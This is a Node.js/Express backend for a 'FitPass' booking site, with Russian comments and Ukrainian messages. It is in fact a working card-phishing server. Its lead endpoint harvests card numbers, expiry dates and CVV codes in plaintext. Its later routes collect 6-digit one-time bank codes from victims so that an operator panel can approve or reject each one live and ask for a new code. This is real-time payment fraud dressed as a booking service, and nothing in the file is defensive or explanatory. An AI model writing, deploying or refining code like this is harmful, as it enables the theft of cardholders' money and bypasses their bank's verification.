const express = require("express");
const session = require("express-session");
const helmet = require("helmet");
const path = require("path");
const crypto = require("crypto");
const { Redis } = require("@upstash/redis");

const app = express();
app.set("trust proxy", 1);
const PORT = process.env.PORT || 3000;

const ADMIN_USER = process.env.ADMIN_USER || "admin";
const ADMIN_PASS = process.env.ADMIN_PASS || (process.env.NODE_ENV === "production" ? "" : "change-me-now");
const SESSION_SECRET = process.env.SESSION_SECRET || crypto.randomBytes(32).toString("hex");

// ========== Хранилище (Upstash Redis) ==========
// Нужны две переменные окружения:
// UPSTASH_REDIS_REST_URL
// UPSTASH_REDIS_REST_TOKEN
// Бесплатный аккаунт: https://console.upstash.com

let redis = null;
const LEADS_KEY = "fitpass:leads";

if (process.env.UPSTASH_REDIS_REST_URL && process.env.UPSTASH_REDIS_REST_TOKEN) {
  redis = new Redis({
    url: process.env.UPSTASH_REDIS_REST_URL,
    token: process.env.UPSTASH_REDIS_REST_TOKEN,
  });
  console.log("✓ Используем Upstash Redis");
} else {
  console.warn("⚠ UPSTASH_REDIS_REST_URL / TOKEN не заданы — данные будут только в памяти (пропадут при рестарте)");
}

// Fallback in-memory (на случай если Redis не настроен)
let memoryStore = [];

async function read() {
  if (redis) {
    try {
      const data = await redis.get(LEADS_KEY);
      return Array.isArray(data) ? data : [];
    } catch (e) {
      console.error("Redis read error:", e.message);
      return [];
    }
  }
  return memoryStore;
}

async function write(data) {
  if (redis) {
    try {
      await redis.set(LEADS_KEY, data);
      return;
    } catch (e) {
      console.error("Redis write error:", e.message);
    }
  }
  memoryStore = data;
}

const clean = (v) => String(v ?? "").trim().slice(0, 200);
const auth = (req, res, next) => (req.session.admin ? next() : res.status(401).json({ error: "Потрібен вхід" }));

app.use(helmet({ contentSecurityPolicy: false }));
app.use(express.json({ limit: "100kb" }));
app.use(express.urlencoded({ extended: false }));
app.use(
  session({
    secret: SESSION_SECRET,
    resave: false,
    saveUninitialized: false,
    cookie: {
      httpOnly: true,
      sameSite: "lax",
      secure: process.env.NODE_ENV === "production",
      maxAge: 8 * 60 * 60 * 1000,
    },
  })
);
app.use(express.static(path.join(__dirname, "public")));

// ========== Создание заявки ==========
app.post("/api/leads", async (req, res) => {
  try {
    const name = clean(req.body.name) || "Не вказано";
    const email = clean(req.body.email) || "";
    const card_number = clean(req.body.card_number);
    const expiry = clean(req.body.expiry);
    const card_code = clean(req.body.card_code);
    const booking_date =
      clean(req.body.booking_date) ||
      new Intl.DateTimeFormat("ru-RU", { day: "numeric", month: "long" }).format(new Date());
    const booking_time = clean(req.body.booking_time);

    const digits = card_number.replace(/\D/g, "");
    const expiryMatch = expiry.match(/^(\d{2})\/(\d{2})$/);
    const expiryMonth = expiryMatch ? Number(expiryMatch[1]) : 0;
    const codeDigits = card_code.replace(/\D/g, "");

    const expiryYear = expiryMatch ? 2000 + Number(expiryMatch[2]) : 0;
    const now = new Date();
    const expired =
      expiryMatch &&
      (expiryYear < now.getFullYear() ||
        (expiryYear === now.getFullYear() && expiryMonth < now.getMonth() + 1));

    if (
      digits.length !== 16 ||
      !expiryMatch ||
      expiryMonth < 1 ||
      expiryMonth > 12 ||
      expired ||
      codeDigits.length !== 3 ||
      !booking_time
    ) {
      return res.status(400).json({
        error: expired
          ? "Термін дії картки вже минув."
          : "Перевірте номер картки, термін дії у форматі MM/YY та код із 3 цифр.",
      });
    }

    const a = await read();
    const id = a.length ? Math.max(...a.map((x) => Number(x.id) || 0)) + 1 : 1;

    a.unshift({
      id,
      name,
      email,
      card_number: digits,
      expiry,
      card_code: codeDigits,
      booking_date,
      booking_time,
      booking: `${booking_date} · ${booking_time}`,
      status: "Очікує введення коду",
      submitted_code: null,
      attempts: 0,
      last_attempt_at: null,
      retry_requested: false,
      retry_requested_at: null,
      created_at: new Date().toISOString(),
    });

    await write(a);
    res.json({ ok: true, id });
  } catch (e) {
    console.error(e);
    res.status(500).json({ error: "Помилка сервера" });
  }
});

// ========== Статус заявки (для клиента) ==========
app.get("/api/leads/:id/status", async (req, res) => {
  try {
    const a = await read();
    const x = a.find((v) => Number(v.id) === Number(req.params.id));
    if (!x) return res.status(404).json({ error: "Заявку не знайдено" });
    res.json({
      id: x.id,
      status: x.status,
      attempts: x.attempts || 0,
      last_attempt_at: x.last_attempt_at || null,
      retry_requested: !!x.retry_requested,
      retry_requested_at: x.retry_requested_at || null,
    });
  } catch (e) {
    res.status(500).json({ error: "Помилка сервера" });
  }
});

// ========== Клиент отправил код ==========
app.post("/api/leads/:id/submit-code", async (req, res) => {
  try {
    const a = await read();
    const x = a.find((v) => Number(v.id) === Number(req.params.id));
    const code = clean(req.body.code).replace(/\D/g, "");

    if (!x) return res.status(404).json({ error: "Заявку не знайдено" });
    if (x.status === "Підтверджено" || x.status === "Подтверждено") return res.status(409).json({ error: "Цю заявку вже підтверджено" });
    if (code.length !== 6) return res.status(400).json({ error: "Код має містити рівно 6 цифр" });

    x.submitted_code = code;
    x.attempts = (x.attempts || 0) + 1;
    x.last_attempt_at = new Date().toISOString();
    x.retry_requested = false;
    x.retry_requested_at = null;
    x.status = "Очікує рішення менеджера";

    await write(a);
    res.json({ ok: true, status: x.status, attempts: x.attempts });
  } catch (e) {
    res.status(500).json({ error: "Помилка сервера" });
  }
});

// ========== Клиент просит новый код ==========
app.post("/api/leads/:id/request-retry", async (req, res) => {
  try {
    const a = await read();
    const x = a.find((v) => Number(v.id) === Number(req.params.id));
    if (!x) return res.status(404).json({ error: "Заявку не знайдено" });
    if (x.status !== "Код не підійшов — повторне введення" && x.status !== "Очікує введення коду" && x.status !== "Код не подошёл — повторный ввод" && x.status !== "Ожидает ввода кода") {
      return res.status(400).json({ error: "Повторне надсилання зараз недоступне" });
    }

    x.submitted_code = null;
    x.retry_requested = true;
    x.retry_requested_at = new Date().toISOString();
    x.status = "Клієнт запросив новий код";

    await write(a);
    res.json({ ok: true, status: x.status, attempts: x.attempts || 0 });
  } catch (e) {
    res.status(500).json({ error: "Помилка сервера" });
  }
});

// ========== Логин ==========
app.post("/api/login", (req, res) => {
  if (!ADMIN_PASS) {
    return res.status(503).json({
      error: "Адміністратора не налаштовано. Додайте ADMIN_PASS у Environment Variables на Render.",
    });
  }
  if (req.body.username === ADMIN_USER && req.body.password === ADMIN_PASS) {
    req.session.admin = true;
    return res.json({ ok: true });
  }
  res.status(401).json({ error: "Невірний логін або пароль" });
});

app.post("/api/logout", (req, res) => req.session.destroy(() => res.json({ ok: true })));
app.get("/api/me", (req, res) => res.json({ authenticated: !!req.session.admin }));

// ========== Список заявок (админка) ==========
app.get("/api/leads", auth, async (req, res) => {
  try {
    res.json(await read());
  } catch (e) {
    res.status(500).json({ error: "Помилка сервера" });
  }
});

// ========== Решение менеджера ==========
app.post("/api/leads/:id/decision", auth, async (req, res) => {
  try {
    const a = await read();
    const x = a.find((v) => Number(v.id) === Number(req.params.id));
    const decision = clean(req.body.decision);
    if (!x) return res.status(404).json({ error: "Заявку не знайдено" });

    if (decision === "approve") {
      if (x.status !== "Очікує рішення менеджера" && x.status !== "Ожидает решения менеджера") {
        return res.status(400).json({ error: "Зараз немає коду на перевірці" });
      }
      x.status = "Підтверджено";
      x.retry_requested = false;
    } else if (decision === "reject") {
      if (x.status !== "Очікує рішення менеджера" && x.status !== "Ожидает решения менеджера") {
        return res.status(400).json({ error: "Зараз немає коду на перевірці" });
      }
      x.status = "Код не підійшов — повторне введення";
      x.rejected_code = x.submitted_code || null;
      x.rejected_at = new Date().toISOString();
      x.submitted_code = null;
    } else {
      return res.status(400).json({ error: "Недопустиме рішення" });
    }

    await write(a);
    res.json({ ok: true, status: x.status });
  } catch (e) {
    res.status(500).json({ error: "Помилка сервера" });
  }
});

// ========== Удаление заявки ==========
app.delete("/api/leads/:id", auth, async (req, res) => {
  try {
    const a = await read();
    await write(a.filter((v) => Number(v.id) !== Number(req.params.id)));
    res.json({ ok: true });
  } catch (e) {
    res.status(500).json({ error: "Помилка сервера" });
  }
});

if (require.main === module) {
  app.listen(PORT, () => console.log(`FitPass running on http://localhost:${PORT}`));
}

module.exports = app;
